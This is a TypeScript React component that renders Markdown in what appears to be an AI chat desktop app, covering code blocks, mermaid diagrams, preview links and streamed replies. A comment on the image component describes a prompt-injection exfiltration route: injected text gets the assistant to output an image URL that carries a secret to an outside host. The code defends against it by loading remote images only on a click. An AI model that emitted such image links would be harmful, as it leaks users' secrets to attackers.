// Markdown with highlighted, copyable code blocks, typeset math, mermaid diagrams and find-in-chat marks. Ported from
// the prototype. Single newlines are kept as line breaks, since replies often put one item per line. Links open in the
// preview pane, never in the app's own window (previewContext.tsx).
import { Children, Fragment, isValidElement, memo, useEffect, useMemo, useReducer, useRef, useState, useSyncExternalStore, type ReactNode, type RefObject } from "react";
import ReactMarkdown, { type Components } from "react-markdown";
import { invoke } from "@tauri-apps/api/core";
import { Check, CodeXml, Copy, Image as ImageIcon, Workflow } from "lucide-react";
import "katex/dist/katex.min.css";
import { PreviewLink } from "./previewContext";
import { splitBlocks, type Blocks } from "./markdownBlocks";
import { rehypePlugins, remarkPlugins } from "./markdownPipeline";
import { drawDiagram, drawnAlready, subscribeTheme, themeNow, type Drawing } from "./mermaid";

/** Rendered Markdown's text: code as it reads, whatever highlighting and find marks it is wrapped in. */
function textOf(node: ReactNode): string {
  if (typeof node === "string" || typeof node === "number") return String(node);
  if (Array.isArray(node)) return node.map(textOf).join("");
  return isValidElement<{ children?: ReactNode }>(node) ? textOf(node.props.children) : "";
}

/**
 * `source` drawn as a diagram in the app's light or dark theme once `box` is in view, or undefined until then and while
 * `wanted` is false.
 */
function useDrawing(source: string, wanted: boolean, box: RefObject<HTMLElement | null>): Drawing | undefined {
  const theme = useSyncExternalStore(subscribeTheme, themeNow, themeNow);
  const [drawn, setDrawn] = useState<{ source: string; drawing: Drawing }>();
  const already = wanted ? drawnAlready(source, theme) : undefined;
  useEffect(() => {
    if (!wanted || already || !box.current) return;
    let live = true;
    const draw = () => void drawDiagram(source, theme).then((drawing) => live && setDrawn({ source, drawing }));
    if (typeof IntersectionObserver === "undefined") {
      draw();
      return () => void (live = false);
    }
    const view = new IntersectionObserver((entries) => {
      if (!entries.some((e) => e.isIntersecting)) return;
      view.disconnect();
      draw();
    });
    view.observe(box.current);
    return () => {
      live = false;
      view.disconnect();
    };
  }, [source, theme, wanted, already, box]);
  // After a switch between light and dark, the drawing in the old theme shows until the new one is done.
  return already ?? (wanted && drawn?.source === source ? drawn.drawing : undefined);
}

/**
 * A code block: its language, Copy, and the code. A finished ```mermaid block shows its diagram, with a switch back
 * to its source; one still coming in (`data-growing`, markdownPipeline.ts) stays source.
 */
function CodeBlock({ children }: { children?: ReactNode }) {
  const code = (Children.toArray(children).find(isValidElement) as { props: { className?: unknown; "data-growing"?: unknown } } | undefined)?.props;
  // The language its `<code>` element names in its class, `language-ts`, or "" for none.
  const language = (typeof code?.className === "string" && code.className.match(/language-(\S+)/)?.[1]) || "";
  const box = useRef<HTMLDivElement>(null);
  const [copied, setCopied] = useState(false);
  const [showSource, setShowSource] = useState(false);
  const diagram = language === "mermaid" && code?.["data-growing"] === undefined;
  const drawing = useDrawing(diagram ? textOf(children) : "", diagram, box);
  const svg = drawing && "svg" in drawing ? drawing.svg : undefined;
  return (
    <div className="code" ref={box}>
      <div className="code-head">
        <span>{language}</span>
        {svg !== undefined && (
          <button className="code-view" onClick={() => setShowSource(!showSource)}>
            {showSource ? <Workflow size={13} /> : <CodeXml size={13} />}
            {showSource ? "Diagram" : "Source"}
          </button>
        )}
        <button
          className="code-copy"
          onClick={() => {
            void navigator.clipboard.writeText(textOf(children));
            setCopied(true);
            setTimeout(() => setCopied(false), 1200);
          }}
        >
          {copied ? <Check size={13} /> : <Copy size={13} />}
          {copied ? "Copied" : "Copy"}
        </button>
      </div>
      {drawing && "note" in drawing && <div className="code-note">{drawing.note}</div>}
      {/* The SVG went through mermaid's strict mode and then mermaid.ts's `contained`. */}
      {svg !== undefined && !showSource ? <div className="code-diagram" dangerouslySetInnerHTML={{ __html: svg }} /> : <pre>{children}</pre>}
    </div>
  );
}

/**
 * An image in Markdown. Hermes's replies carry text it read from web pages, files and tool output, so a prompt injection
 * can ask for `![](https://host/?d=<secret>)`, and loading it would send the secret there. A source on the network is
 * shown as its host and loads only on a click, which never also follows a link around it (ADR 0099). react-markdown has
 * already emptied `data:` and other sources it doesn't allow.
 */
function MarkdownImage({ src, alt, title }: { src?: string; alt?: string; title?: string }) {
  const [load, setLoad] = useState<"loading" | { dataUrl: string } | { failed: string }>();
  if (!src) return <img alt={alt} title={title} />;
  if (typeof load === "object" && "dataUrl" in load) return <img src={load.dataUrl} alt={alt} title={title} />;
  let host = src;
  try {
    host = new URL(src, location.href).host || src;
  } catch {}
  const image = `${alt ? `${alt}: image` : "Image"} from ${host}`;
  return (
    <button
      type="button"
      className="md-image"
      title={src}
      onClick={(e) => {
        e.preventDefault();
        e.stopPropagation();
        if (load === "loading") return;
        setLoad("loading");
        // `//host/p.png` has no scheme for Rust to read; the app's own page is `tauri:` on Linux, so it can't lend one.
        invoke<string>("markdown_image_load", { url: src.startsWith("//") ? `https:${src}` : src }).then(
          (dataUrl) => setLoad({ dataUrl }),
          (error: unknown) => setLoad({ failed: error instanceof Error ? error.message : String(error) }),
        );
      }}
    >
      <ImageIcon size={13} />
      {load === "loading" ? `${image}, loading…` : load ? `${image} didn't load. ${load.failed} Click to try again.` : `${image}, click to load`}
    </button>
  );
}

// Made once, not on each render: a new `pre` function would be a new component type to React, which would throw away
// every code block's DOM and build it again on each streamed delta (#224).
const components: Components = {
  pre: ({ children }) => <CodeBlock>{children}</CodeBlock>,
  a: ({ href, title, children }) => (
    <PreviewLink href={href} title={title}>
      {children}
    </PreviewLink>
  ),
  img: ({ src, alt, title }) => <MarkdownImage src={typeof src === "string" ? src : undefined} alt={alt} title={title} />,
};

/**
 * One piece of Markdown, rendered again only when its text, the find-in-chat query, or whether it is still growing
 * changes. `growing`: it is the end of a reply still streaming in, and ends in code that isn't finished, which stays
 * plain until it is. `live`: it is part of a reply still streaming in, so code whose language has to be guessed shows
 * plain in the render that finishes it, and highlighted in the next, after the guess (#451). `live` changing is not a
 * reason to render again: a reply ending would otherwise render each of its blocks again.
 */
const Part = memo(
  function Part({ text, query, growing, live }: { text: string; query: string; growing: boolean; live: boolean }) {
    const [, guessed] = useReducer((n: number) => n + 1, 0);
    const plugins = useMemo(() => rehypePlugins(query, growing ? text : undefined, live ? guessed : undefined), [query, growing, text, live]);
    return (
      <ReactMarkdown remarkPlugins={remarkPlugins} rehypePlugins={plugins} components={components}>
        {text}
      </ReactMarkdown>
    );
  },
  (a, b) => a.text === b.text && a.query === b.query && a.growing === b.growing,
);

/**
 * `query`: the find-in-chat text to mark. `streaming`: the text is a reply still coming in, a delta at a time. From then
 * on, for as long as it stays on screen, it renders a top-level block at a time, so a delta parses only the last block
 * again, not every block before it, and code still coming in is highlighted once it is finished (ADR 0068). Once
 * finished, it comes out as the text rendered in one piece would.
 */
export const Markdown = memo(function Markdown({ text, query = "", streaming = false }: { text: string; query?: string; streaming?: boolean }) {
  const streamed = useRef(false);
  const split = useRef<Blocks | undefined>(undefined);
  streamed.current ||= streaming;
  if (!streamed.current) return <Part text={text} query={query} growing={false} live={false} />;
  // A cache of the last split, so each delta parses only from the last blocks on; the same text gives the same blocks.
  const blocks = (split.current = splitBlocks(text, split.current));
  if (blocks.whole) return <Part text={text} query={query} growing={streaming && !!blocks.blocks[blocks.blocks.length - 1]?.open} live={streaming} />;
  const last = blocks.blocks.length - 1;
  // A "\n" between blocks, as between the top-level elements of the text rendered in one piece.
  return blocks.blocks.map((b, i) => (
    <Fragment key={i}>
      {i > 0 && "\n"}
      <Part text={b.text} query={query} growing={streaming && i === last && b.open} live={streaming} />
    </Fragment>
  ));
});
